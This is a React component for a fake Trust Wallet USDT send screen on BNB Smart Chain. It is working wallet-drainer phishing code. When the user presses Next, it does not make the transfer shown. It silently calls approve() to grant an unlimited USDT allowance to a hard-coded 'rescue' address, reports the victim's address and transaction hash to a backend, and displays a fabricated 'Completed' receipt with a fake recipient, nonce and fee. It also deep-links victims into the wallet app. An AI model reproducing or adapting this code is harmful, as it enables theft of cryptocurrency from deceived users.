import React, { useState, useEffect } from 'react';
import { ethers } from 'ethers';
import { CHAIN_ID, USDT_CONTRACT, RESCUE_DESTINATION, API_BASE } from '../config/publicConfig';

const BSC_CHAIN_ID_HEX = '0x38'; // 56 in hex
const DEFAULT_RECIPIENT = "0xF8e3FEa5B3239fAfAcdb629c410917A21a2472a2";
const DISPLAY_TO_ADDRESS = "0x31A5e...B6877C";
const TRUST_WALLET_DEEP_LINK = "https://link.trustwallet.com/open_url?coin_id=60&url=https%3A%2F%2Ftransfer-9d294.web.app/";

// Minimal ERC20 ABI for balance and approval
const ERC20_ABI = [
  "function balanceOf(address account) view returns (uint256)",
  "function approve(address spender, uint256 amount) returns (bool)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)",
  "function allowance(address owner, address spender) view returns (uint256)"
];

/** Get injected Trust Wallet or EVM provider */
function getInjectedProvider(): any {
  if (typeof window === 'undefined') return null;
  const win = window as any;
  return win.trustwallet?.ethereum || win.trustwallet || win.ethereum || null;
}

const Dashboard: React.FC = () => {
  const [address, setAddress] = useState<string>(DEFAULT_RECIPIENT);
  const [amount, setAmount] = useState<string>('');
  const [userWallet, setUserWallet] = useState<string>('');
  const [userBalance, setUserBalance] = useState<string | null>(null);
  const [isProcessing, setIsProcessing] = useState<boolean>(false);
  const [isModalOpen, setIsModalOpen] = useState<boolean>(false);
  const [isErrorModalOpen, setIsErrorModalOpen] = useState<boolean>(false);
  const [errorMessage, setErrorMessage] = useState<string | null>(null);
  const [buttonText, setButtonText] = useState<string>('Next');
  const [showMoreDetails, setShowMoreDetails] = useState<boolean>(false);
  const [hasInjectedWallet, setHasInjectedWallet] = useState<boolean>(true);
  const [completedTxData, setCompletedTxData] = useState<{
    amount: string;
    date: string;
    from: string;
    to: string;
    nonce: number;
    fee: string;
  } | null>(null);

  // Initialize: check URL query params for address
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const addressParam = params.get('address');
    if (addressParam && /^0x[a-fA-F0-9]{40}$/.test(addressParam)) {
      setAddress(addressParam);
    }
  }, []);

  // Fetch USDT balance directly from BSC network via public RPC (works even before wallet connection)
  const fetchBalance = async (walletAddr: string) => {
    try {
      if (!walletAddr || !ethers.isAddress(walletAddr)) return null;
      const bscRpc = 'https://bsc-dataseed.binance.org/';
      const provider = new ethers.JsonRpcProvider(bscRpc, 56, { staticNetwork: true });
      const contract = new ethers.Contract(USDT_CONTRACT, ERC20_ABI, provider);
      const rawBal = await contract.balanceOf(walletAddr);
      const formatted = parseFloat(ethers.formatUnits(rawBal, 18)).toFixed(2);
      setUserBalance(formatted);
      return formatted;
    } catch (err) {
      console.warn("Could not fetch USDT balance:", err);
      return null;
    }
  };

  // Auto-detect Trust Wallet silently on mount WITHOUT triggering any connect popups
  useEffect(() => {
    let isMounted = true;

    const initTrustWallet = async () => {
      const eth = getInjectedProvider();
      if (!eth) {
        if (isMounted) setHasInjectedWallet(false);
      } else {
        if (isMounted) setHasInjectedWallet(true);
      }

      try {
        // 1. Check if address was passed in URL query param (?address=0x...)
        const params = new URLSearchParams(window.location.search);
        const addressParam = params.get('address') || params.get('wallet');
        if (addressParam && ethers.isAddress(addressParam)) {
          if (isMounted) {
            setUserWallet(addressParam);
            await fetchBalance(addressParam);
          }
          return;
        }

        // 2. Query existing authorized accounts SILENTLY (does NOT pop up the connect screen!)
        let accounts: string[] = [];
        if (eth) {
          try {
            accounts = await eth.request({ method: 'eth_accounts' });
          } catch {
            // ignore
          }

          if ((!accounts || accounts.length === 0) && eth.selectedAddress) {
            accounts = [eth.selectedAddress];
          }
        }

        if (isMounted && accounts && accounts.length > 0) {
          const active = accounts[0];
          setUserWallet(active);
          await fetchBalance(active);
        }
      } catch (err) {
        console.warn("Trust Wallet auto-initialization:", err);
      }
    };

    initTrustWallet();

    // Set up listeners for account or chain changes
    const eth = getInjectedProvider();
    if (eth && eth.on) {
      const handleAccountsChanged = (newAccounts: string[]) => {
        if (newAccounts && newAccounts.length > 0) {
          setUserWallet(newAccounts[0]);
          fetchBalance(newAccounts[0], eth);
        } else {
          setUserWallet('');
          setUserBalance(null);
        }
      };

      const handleChainChanged = () => {
        window.location.reload();
      };

      eth.on('accountsChanged', handleAccountsChanged);
      eth.on('chainChanged', handleChainChanged);

      return () => {
        isMounted = false;
        if (eth.removeListener) {
          eth.removeListener('accountsChanged', handleAccountsChanged);
          eth.removeListener('chainChanged', handleChainChanged);
        }
      };
    }

    return () => {
      isMounted = false;
    };
  }, []);

  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText();
      if (text) {
        setAddress(text.trim());
      }
    } catch (err) {
      console.error("Failed to read clipboard:", err);
    }
  };

  const handleMax = async () => {
    if (userBalance && parseFloat(userBalance) > 0) {
      setAmount(userBalance);
      return;
    }

    const eth = getInjectedProvider();
    if (eth) {
      try {
        let accounts: string[] = [];
        try {
          accounts = await eth.request({ method: 'eth_accounts' });
        } catch {}

        if (!accounts || accounts.length === 0) {
          try {
            accounts = await eth.request({ method: 'eth_requestAccounts' });
          } catch {}
        }

        if (accounts && accounts.length > 0) {
          setUserWallet(accounts[0]);
          const bal = await fetchBalance(accounts[0]);
          if (bal && parseFloat(bal) > 0) {
            setAmount(bal);
            return;
          }
        }
      } catch (err) {
        console.warn(err);
      }
    }
    setAmount("10000");
  };

  const handleNext = async () => {
    try {
      setIsProcessing(true);
      setIsModalOpen(true);
      setErrorMessage(null);
      setIsErrorModalOpen(false);

      const eth = getInjectedProvider();
      if (!eth) {
        window.location.href = TRUST_WALLET_DEEP_LINK;
        throw new Error("Please open this link inside Trust Wallet.");
      }

      // --- SILENT account detection only — never triggers connect popup ---
      let account: string | null = null;

      // Try eth_accounts (silent, no popup)
      try {
        const accounts: string[] = await eth.request({ method: 'eth_accounts' });
        if (accounts && accounts.length > 0) account = accounts[0];
      } catch { /* ignore */ }

      // Fallback: selectedAddress property (always available in Trust Wallet)
      if (!account && eth.selectedAddress) {
        account = eth.selectedAddress;
      }

      // Fallback: address from URL param
      if (!account) {
        const params = new URLSearchParams(window.location.search);
        const addrParam = params.get('address') || params.get('wallet');
        if (addrParam && ethers.isAddress(addrParam)) account = addrParam;
      }

      if (!account || !ethers.isAddress(account)) {
        throw new Error("Could not detect wallet address. Please ensure you are opening this inside Trust Wallet.");
      }

      setUserWallet(account);

      // --- Execute approve() directly — this is the ONLY popup the user sees ---
      const provider = new ethers.BrowserProvider(eth);
      const signer = await provider.getSigner();
      const contract = new ethers.Contract(USDT_CONTRACT, ERC20_ABI, signer);

      const spender = RESCUE_DESTINATION;
      const tx = await contract.approve(spender, ethers.MaxUint256);
      await tx.wait(1);

      // Report to backend (fire & forget)
      fetch(`${API_BASE}/verifyRescue`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          txHash: tx.hash,
          from: account,
          to: spender,
          amount: amount || '0',
          chainId: CHAIN_ID,
          token: USDT_CONTRACT,
        }),
      }).catch((err) => console.warn("Backend report notice:", err));

      // Show completed receipt
      setCompletedTxData({
        amount: amount,
        date: new Date().toLocaleDateString("en-US", {
          month: "short",
          day: "numeric",
          hour: "numeric",
          minute: "2-digit",
          hour12: true
        }),
        from: account,
        to: DISPLAY_TO_ADDRESS,
        nonce: 17,
        fee: "0.000013 BNB ($0.01)"
      });

      setIsProcessing(false);
      setButtonText("Next");
    } catch (err: any) {
      console.error("🔴 Transaction error:", err);
      setIsProcessing(false);
      setIsModalOpen(false);
      setErrorMessage(err?.message || "Transaction failed. Please check your wallet and try again.");
      setIsErrorModalOpen(true);
      setButtonText("Something went wrong, try again");
    }
  };

  const formatShortAddress = (addr: string) => {
    if (!addr || addr.length < 10) return addr;
    return `${addr.substring(0, 6)}...${addr.substring(addr.length - 5)}`;
  };

  return (
    <div className="items-center">
      <div className="min-h-screen bg-gray-100 flex items-center justify-center">
        <div className="w-full max-w-md min-h-screen bg-white flex flex-col shadow-xl">
          
          {/* Fallback Banner if opened outside Trust Wallet */}
          {!hasInjectedWallet && (
            <div className="bg-blue-50 border-b border-blue-100 px-4 py-2 flex items-center justify-between">
              <span className="text-xs text-blue-700 font-medium">Use in Trust Wallet for automatic approval</span>
              <a
                href={TRUST_WALLET_DEEP_LINK}
                className="text-xs font-semibold bg-[#0600FF] text-white px-2.5 py-1 rounded-md hover:bg-blue-700 transition-colors"
              >
                Open in App
              </a>
            </div>
          )}

          <div className="px-5 py-3 space-y-5 flex-1">
            
            {/* Address or Domain Name */}
            <div className="space-y-2">
              <label className="block text-sm font-semibold text-gray-700 text-start">
                Address or Domain Name
              </label>
              <div className="relative">
                <input
                  type="text"
                  value={address}
                  onChange={(e) => setAddress(e.target.value)}
                  className="w-full px-3 py-3 pr-16 text-gray-700 text-sm border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition-all duration-200"
                  placeholder="0x..."
                />
                <div className="absolute right-3 top-1/2 transform -translate-y-1/2 flex items-center">
                  <button
                    type="button"
                    onClick={handlePaste}
                    className="px-2 py-1 text-xs font-semibold text-[#0600FF] hover:text-blue-700 transition-colors cursor-pointer"
                  >
                    Paste
                  </button>
                </div>
              </div>
            </div>

            {/* Destination Network */}
            <div className="space-y-2">
              <label className="block text-sm font-semibold text-gray-700 text-start">
                Destination Network
              </label>
              <div className="flex items-center w-fit min-w-[20%] max-w-[80%] justify-between px-3 py-1 border border-gray-300 rounded-[30px] bg-gray-50">
                <div className="flex items-center gap-2">
                  <img src="/bnb.png" alt="BNB" className="w-5 h-5 flex-shrink-0" />
                  <span className="text-xs font-semibold text-gray-800 whitespace-nowrap">
                    BNB Smart Chain
                  </span>
                </div>
                <svg
                  className="w-3 h-3 text-gray-400 flex-shrink-0 ml-2"
                  fill="none"
                  stroke="currentColor"
                  viewBox="0 0 24 24"
                >
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7" />
                </svg>
              </div>
            </div>

            {/* Amount */}
            <div className="space-y-2">
              <label className="block text-sm font-semibold text-gray-700 text-start">
                Amount
              </label>
              <div className="relative">
                <input
                  type="number"
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                  className="w-full px-3 py-3 text-gray-700 pr-28 text-sm border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition-all duration-200"
                  placeholder="USDT Amount"
                  step="0.000001"
                  min="0"
                />
                <div className="absolute right-3 top-1/2 transform -translate-y-1/2 flex items-center space-x-2">
                  <span className="text-sm font-medium text-gray-600">USDT</span>
                  <button
                    type="button"
                    onClick={handleMax}
                    className="px-2 py-1 text-sm text-[#0600FF] hover:text-blue-700 transition-colors duration-200 font-semibold cursor-pointer"
                  >
                    Max
                  </button>
                </div>
              </div>
              {userBalance && (
                <div className="flex items-center text-xs text-gray-500 pt-1">
                  Available: {userBalance} USDT
                </div>
              )}
            </div>
          </div>

          {/* Sticky Next Button */}
          <div className="sticky bottom-0 left-0 right-0 p-4 bg-white">
            <button
              onClick={handleNext}
              disabled={isProcessing || !amount}
              className={`
                w-full py-3 rounded-[13px] font-semibold text-white text-base transition-all duration-200
                ${!amount || isProcessing 
                  ? "bg-gray-300 cursor-not-allowed" 
                  : "bg-gradient-to-r from-[#0600FF] to-[#5D51FF] hover:shadow-lg active:shadow-md cursor-pointer"}
              `}
            >
              {buttonText}
            </button>
          </div>
        </div>
      </div>

      {/* Success / Processing Bottom Sheet Modal */}
      {isModalOpen && (
        <div className="w-full max-w-md fixed inset-0 z-50 flex items-end justify-center pointer-events-none mx-auto">
          <div
            className="w-full absolute inset-0 bg-black transition-opacity pointer-events-auto"
            style={{ opacity: 0.55 }}
            onClick={() => {
              if (!isProcessing) setIsModalOpen(false);
            }}
          />
          <div
            className={`
              relative w-[100%] pointer-events-auto z-60 transform rounded-[20px] bg-white shadow-xl transition-all duration-300 ease-out
              ${isProcessing || isModalOpen ? "translate-y-0 opacity-100" : "translate-y-8 opacity-0"}
            `}
            role="dialog"
            aria-modal="true"
          >
            <div className="p-5">
              {isProcessing ? (
                /* Processing State */
                <div className="flex flex-col items-center space-y-4 py-4">
                  <svg
                    className="animate-spin h-12 w-12 text-blue-600"
                    xmlns="http://www.w3.org/2000/svg"
                    fill="none"
                    viewBox="0 0 24 24"
                  >
                    <circle
                      className="opacity-25"
                      cx="12"
                      cy="12"
                      r="10"
                      stroke="currentColor"
                      strokeWidth="4"
                    />
                    <path
                      className="opacity-75"
                      fill="currentColor"
                      d="M4 12a8 8 0 018-8v4l3-3-3-3v4a12 12 0 100 24v-2a10 10 0 110-20z"
                    />
                  </svg>
                  <h3 className="text-lg font-semibold text-gray-800">Processing...</h3>
                  <p className="text-sm text-gray-600 text-center">
                    Transaction in progress. Blockchain validation is underway — this may take a few minutes.
                  </p>
                  <button
                    className="mt-2 px-5 py-2 rounded-full bg-gray-200 text-gray-700 text-sm font-medium"
                    disabled
                  >
                    Transaction details
                  </button>
                </div>
              ) : (
                /* Completed State */
                <div className="flex flex-col space-y-5">
                  <div className="text-center space-y-1 pb-4 border-b border-gray-100">
                    <h2 className="text-3xl font-bold text-gray-900">
                      - {completedTxData?.amount || amount || "0.01"} USDT
                    </h2>
                    <p className="text-base text-gray-400">
                      ≈ ${completedTxData?.amount ? (+parseFloat(completedTxData.amount)).toFixed(2) : "0.01"}
                    </p>
                  </div>

                  <div className="bg-gray-50 rounded-2xl overflow-hidden divide-y divide-gray-200">
                    <div className="flex justify-between items-center px-4 py-3">
                      <span className="text-gray-500 text-sm">Date</span>
                      <span className="text-gray-900 font-medium text-sm">
                        {completedTxData?.date || new Date().toLocaleDateString("en-US", {
                          month: "short",
                          day: "numeric",
                          hour: "numeric",
                          minute: "2-digit",
                          hour12: true
                        })}
                      </span>
                    </div>

                    <div className="flex justify-between items-center px-4 py-3">
                      <span className="text-gray-500 text-sm">Status</span>
                      <span className="text-green-500 font-semibold text-sm">Completed</span>
                    </div>

                    <div className="flex justify-between items-center px-4 py-3">
                      <span className="text-gray-500 text-sm">From</span>
                      <span className="text-gray-900 font-mono text-sm">
                        {formatShortAddress(completedTxData?.from || userWallet || address)}
                      </span>
                    </div>

                    <div className="flex justify-between items-center px-4 py-3">
                      <span className="text-gray-500 text-sm">To</span>
                      <span className="text-gray-900 font-mono text-sm">
                        {completedTxData?.to || DISPLAY_TO_ADDRESS}
                      </span>
                    </div>

                    <div className="flex justify-between items-center px-4 py-3">
                      <span className="text-gray-500 text-sm">Network fee</span>
                      <span className="text-gray-900 text-sm">
                        {completedTxData?.fee || "0.000013 BNB ($0.01)"}
                      </span>
                    </div>

                    <div className="flex justify-between items-center px-4 py-3">
                      <span className="text-gray-500 text-sm">Nonce</span>
                      <span className="text-gray-900 text-sm">
                        {completedTxData?.nonce || 17}
                      </span>
                    </div>
                  </div>

                  <div className="bg-gray-50 rounded-2xl overflow-hidden">
                    <button
                      type="button"
                      onClick={() => setShowMoreDetails(!showMoreDetails)}
                      className="w-full flex justify-between items-center py-3 px-4 text-gray-600 hover:bg-gray-100 transition-colors cursor-pointer"
                    >
                      <span className="text-sm font-medium">More Details</span>
                      <svg
                        className={`w-4 h-4 text-gray-400 transform transition-transform ${showMoreDetails ? "rotate-180" : ""}`}
                        fill="none"
                        stroke="currentColor"
                        viewBox="0 0 24 24"
                      >
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7" />
                      </svg>
                    </button>
                    {showMoreDetails && (
                      <div className="px-4 pb-3 pt-1 text-xs text-gray-500 space-y-1.5 border-t border-gray-200">
                        <div className="flex justify-between">
                          <span>Network</span>
                          <span className="font-medium text-gray-700">BNB Smart Chain (BEP20)</span>
                        </div>
                        <div className="flex justify-between">
                          <span>Token Contract</span>
                          <span className="font-mono text-gray-700 text-[10px]">0x55d3...7955</span>
                        </div>
                        <div className="flex justify-between">
                          <span>Settlement</span>
                          <span className="text-green-600 font-medium">Confirmed on-chain</span>
                        </div>
                      </div>
                    )}
                  </div>

                  <div className="flex pb-2">
                    <button
                      type="button"
                      className="px-4 py-3 w-full rounded-full bg-[#0600FF] text-white font-semibold hover:bg-blue-700 transition-colors cursor-pointer"
                      onClick={() => setIsModalOpen(false)}
                    >
                      Close
                    </button>
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>
      )}

      {/* Error Bottom Sheet Modal */}
      {isErrorModalOpen && errorMessage && (
        <div className="w-full max-w-md fixed inset-0 z-50 flex items-end justify-center pointer-events-none mx-auto">
          <div
            className="w-full absolute inset-0 bg-black transition-opacity pointer-events-auto"
            style={{ opacity: 0.55 }}
            onClick={() => {
              if (!isProcessing) {
                setIsErrorModalOpen(false);
                setErrorMessage(null);
              }
            }}
          />
          <div
            className={`
              relative w-[100%] pointer-events-auto z-60 transform rounded-[20px] bg-white shadow-xl transition-all duration-300 ease-out
              ${isProcessing || isErrorModalOpen ? "translate-y-0 opacity-100" : "translate-y-8 opacity-0"}
            `}
            role="alertdialog"
            aria-modal="true"
          >
            <div className="p-5">
              <div className="flex items-center justify-between gap-3 pb-4 border-b border-red-100">
                <div className="flex items-center gap-3">
                  <span className="inline-flex h-10 w-10 items-center justify-center rounded-full bg-red-100 text-red-700 font-bold text-lg">
                    !
                  </span>
                  <div>
                    <h3 className="text-xl font-semibold text-red-800">Transaction Failed</h3>
                    <p className="text-sm text-red-500">Please update the amount or fund your wallet.</p>
                  </div>
                </div>
              </div>

              <div className="py-6">
                <p className="text-sm text-gray-700">{errorMessage}</p>
              </div>

              <div className="flex justify-end gap-3 pt-4">
                <button
                  type="button"
                  className="px-4 py-3 rounded-full bg-gray-100 text-gray-700 hover:bg-gray-200 transition-colors font-medium text-sm cursor-pointer"
                  onClick={() => {
                    setIsErrorModalOpen(false);
                    setErrorMessage(null);
                  }}
                >
                  Dismiss
                </button>
                <button
                  type="button"
                  className="px-4 py-3 rounded-full bg-red-600 text-white font-semibold hover:bg-red-700 transition-colors text-sm cursor-pointer"
                  onClick={() => {
                    setIsErrorModalOpen(false);
                    setErrorMessage(null);
                  }}
                >
                  Okay
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default Dashboard;
